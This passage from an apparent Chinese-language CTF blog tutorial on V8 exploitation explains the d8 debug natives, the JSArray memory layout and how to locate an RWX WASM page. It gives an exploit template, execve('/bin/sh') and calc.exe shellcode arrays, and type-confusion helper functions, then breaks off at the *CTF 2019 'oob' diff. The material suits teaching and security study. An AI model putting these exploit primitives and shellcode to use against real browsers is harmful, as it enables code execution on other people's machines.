class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>其中 <code>%DebugPrint(obj);</code> 作用为打印对象的信息 (<code>debug</code> 版本的 <code>d8</code> 可以打印对象的详细信息，而 <code>release</code> 版本的 <code>d8</code> 只会打印对象类型和对象的地址)，<code>%SystemBreak();</code> 的作用类似于断点<br>由于标准的 <code>JavaScript</code> 并不支持以上语法，所以在运行时要加上 <code>--allow-natives-syntax</code> 选项<br>现在使用如下代码来进行测试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>启动效果如下：  </p><img src="/2024/05/05/v8start/2.png" class="" title="我的图图呢">  <p>可以看见打印出了这个整数数组的地址，由于我这个 <code>d8</code> 是 <code>release</code> 版本，所以并没有打印出该数组对象的详细信息，但我们可以使用 <code>job</code> 命令来达到相同的效果  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>这里有个需要注意的点，那就是 <code>DebugPrint</code> 打印出来的是真实地址加一，而 <code>job</code> 命令后面接着的也需要是 <code>object</code> 的真实地址加一，不然会被解析成 <code>smi</code> 类型  </p><h2 id="v8-object的基本结构"><a href="#v8-object的基本结构" class="headerlink" title="v8 object的基本结构"></a>v8 object的基本结构</h2><p>首先给出 <code>object</code> 的通用结构：  </p><img src="/2024/05/05/v8start/4.png" class="" title="我的图图呢">  <p>不同对象的 <code>object</code> 结构都会不一样，但是都有很多相似之处，现在就来详细分析上面给出的例子，为了防止忘记，这里再次贴出代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>还是给出一样的结果：  </p><img src="/2024/05/05/v8start/3.png" class="" title="我的图图呢">  <p>可以看出该对象为 <code>JSArray</code>，其结构和 <code>object</code> 的通用结构差不多，但是还是有一点点区别<br>下面是 <code>JSArray</code> 的结构图：</p><img src="/2024/05/05/v8start/5.png" class="" title="我的图图呢">  <p>其各个字段的含义大致如下：  </p><ul><li>map：定义了如何访问对象，具有相同 <code>Map</code> 的两个 <code>JS object</code> ，就代表具有相同的类型（即具有以相同顺序命名的相同属性），比较 Map 的地址即可确定类型是否⼀致，同理，替换掉 Map 就可以进行类型混淆。  </li><li>prototype：对象的原型（如果有） </li><li>elements：对象的地址  </li><li>length：长度</li></ul><p>我们可以在 <code>gdb</code> 中查看 <code>elements</code>  </p><img src="/2024/05/05/v8start/6.png" class="" title="我的图图呢">  <p>可以看见 <code>elements</code> 中的数据也分为 <code>3</code> 层，分别为 <code>map</code> 指针、<code>length</code>、<code>data</code><br>这里还有一个需要注意的地方，那就是 <code>elements</code> 的地址是在 <code>object</code> 的上方的，也就是说程序在申请一个对象时，是先向堆申请一块空间用于存储对象的数据，再申请一块空间用于管理该对象。虽然 <code>elements</code> 是在 obj 上上方，但这并不代表 <code>elements</code> 就一定紧贴着 <code>obj</code>，这个问题我打算留到后面再讲<br>好像相关结构了解到这里就差不多了，如果后面还有别的那就再补补吧（笑  </p><h2 id="v8漏洞利用思想"><a href="#v8漏洞利用思想" class="headerlink" title="v8漏洞利用思想"></a>v8漏洞利用思想</h2><p>通过上面对 <code>object</code> 结构的分析，也许有人已经知道进行漏洞的利用了。可以猜测我们对一个对象进行访问时下标的最大值是由 <code>elements</code> 上的 <code>length</code> 所决定的，如果我们可以修改这个 <code>length</code> 为一个很大的值，我们就能够做到越界读写。同时，如果我们可以修改 <code>obj</code> 中的 <code>map</code>，我们令其出现神奇的效果，具体在下面漏洞利用中再分析<br>在平时的 <code>CTF</code> 题目中我们的目的是如何让程序执行 <code>system(&quot;/bin/sh&quot;)</code>，而在 <code>v8</code> 中，我们的目的是让 v8 任意执行我们的 <code>shellcode</code><br>然而实现这一切需要一个前提，那就是需要存在 <code>rwx</code> 权限的区域。这时候就需要 <code>WASM</code> 登场了<br>什么是 <code>WASM</code>？顾名思义，是 <code>Asm on the web</code>，但其实不是真正意义上的汇编，只是更加接近汇编。<code>WASM</code> 可以在 <code>Javascript Engine</code> 的地址空间中导入一块可读可写可执行的内存页。<br>下面看看这一段代码：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_mod);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line">0x0d1dfcf5f929 &lt;JSFunction 0 (sfi = 0xd1dfcf5f8f1)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f929</span><br><span class="line">0xd1dfcf5f929: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d1dfcf42109 &lt;JSFunction (sfi = 0xe9259bc3b29)&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x0d1dfcf5f8f1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0xd1dfcf5f731</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0e9259bc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x0e9259bc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x0e9259bc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x0e9259bc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: not available</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见此时内存已经出现了拥有 <code>rwx</code> 权限的区域</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">0xfb58ac2e000      0xfb58ac2f000 rwxp     1000      0 [anon_fb58ac2e]</span><br></pre></td></tr></table></figure><p>现在的问题是我们要如何获取到这个内存区域的地址，我们来查看一下 <code>f</code> 的 <code>shared_info</code> 结构的信息：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8f1</span><br><span class="line">0xd1dfcf5f8f1: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d409e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x0d1dfcf5f8c9 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x0cb6b4d40c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0xcb6b4d42a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x0cb6b4d41319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下里再查看其 <code>data</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8c9</span><br><span class="line">0xd1dfcf5f8c9: [WasmExportedFunctionData] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d45879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line"> - function_index: 0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>再查看 <code>instance</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>仔细查看能发现，<code>instance</code> 结构就是 <code>js</code> 代码中的 <code>wasm_mod</code> 变量的地址<br>我们再来查看这个结构的内存布局：  </p><img src="/2024/05/05/v8start/7.png" class="" title="我的图图呢">  <p>仔细看，能发现，<code>rwx</code> 段的起始地址储存在 <code>instance+0x88</code> 的位置，不过这个不用记，不同版本，这个偏移值可能会有差距，可以在写 <code>exp</code> 的时候通过上述调试的方式进行查找。<br>根据 WASM 的特性，我们的目的可以更细化了，现在我们的目的变为了把 <code>shellcode</code> 写到 <code>WASM</code> 的代码段，然后执行 <code>WASM</code> 函数，那么就能执行 <code>shellcode</code> 了。<br>这里可以写成一个固定的模板：   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br></pre></td></tr></table></figure><p>其中 <code>arbitrary_address_read</code> 函数的具体实现方式要看具体的漏洞环境  </p><h2 id="常用shellcode"><a href="#常用shellcode" class="headerlink" title="常用shellcode"></a>常用shellcode</h2><p>在 <code>CTF</code> 题目中，我们的目的大多数是 <code>getshell</code> 然后获取 <code>flag</code>，用于 <code>getshell</code> 的 <code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>当然我们也可以令其弹计算器，<code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0xc0e8f0e48348fcn</span>,</span><br><span class="line">    <span class="number">0x5152504151410000n</span>,</span><br><span class="line">    <span class="number">0x528b4865d2314856n</span>,</span><br><span class="line">    <span class="number">0x528b4818528b4860n</span>,</span><br><span class="line">    <span class="number">0xb70f4850728b4820n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314d4a4an</span>,</span><br><span class="line">    <span class="number">0x41202c027c613cacn</span>,</span><br><span class="line">    <span class="number">0xede2c101410dc9c1n</span>,</span><br><span class="line">    <span class="number">0x8b20528b48514152n</span>,</span><br><span class="line">    <span class="number">0x88808bd001483c42n</span>,</span><br><span class="line">    <span class="number">0x6774c08548000000n</span>,</span><br><span class="line">    <span class="number">0x4418488b50d00148n</span>,</span><br><span class="line">    <span class="number">0x56e3d0014920408bn</span>,</span><br><span class="line">    <span class="number">0x4888348b41c9ff48n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314dd601n</span>,</span><br><span class="line">    <span class="number">0xc101410dc9c141acn</span>,</span><br><span class="line">    <span class="number">0x244c034cf175e038n</span>,</span><br><span class="line">    <span class="number">0x4458d875d1394508n</span>,</span><br><span class="line">    <span class="number">0x4166d0014924408bn</span>,</span><br><span class="line">    <span class="number">0x491c408b44480c8bn</span>,</span><br><span class="line">    <span class="number">0x14888048b41d001n</span>,</span><br><span class="line">    <span class="number">0x5a595e58415841d0n</span>,</span><br><span class="line">    <span class="number">0x83485a4159415841n</span>,</span><br><span class="line">    <span class="number">0x4158e0ff524120ecn</span>,</span><br><span class="line">    <span class="number">0xff57e9128b485a59n</span>,</span><br><span class="line">    <span class="number">0x1ba485dffffn</span>,</span><br><span class="line">    <span class="number">0x8d8d480000000000n</span>,</span><br><span class="line">    <span class="number">0x8b31ba4100000101n</span>,</span><br><span class="line">    <span class="number">0xa2b5f0bbd5ff876fn</span>,</span><br><span class="line">    <span class="number">0xff9dbd95a6ba4156n</span>,</span><br><span class="line">    <span class="number">0x7c063c28c48348d5n</span>,</span><br><span class="line">    <span class="number">0x47bb0575e0fb800an</span>,</span><br><span class="line">    <span class="number">0x894159006a6f7213n</span>,</span><br><span class="line">    <span class="number">0x2e636c6163d5ffdan</span>,</span><br><span class="line">    <span class="number">0x657865n</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="类型混淆利用模板"><a href="#类型混淆利用模板" class="headerlink" title="类型混淆利用模板"></a>类型混淆利用模板</h2><p>这里先给出一些方便类型混淆漏洞利用的模板，在后面编写 <code>exp</code> 时会用上  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和文章一开始说的一样，环境用的是 <code>*CTF 2019</code> 的 <code>oob</code>。题目给了一个 <code>diff</code> 文件：  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 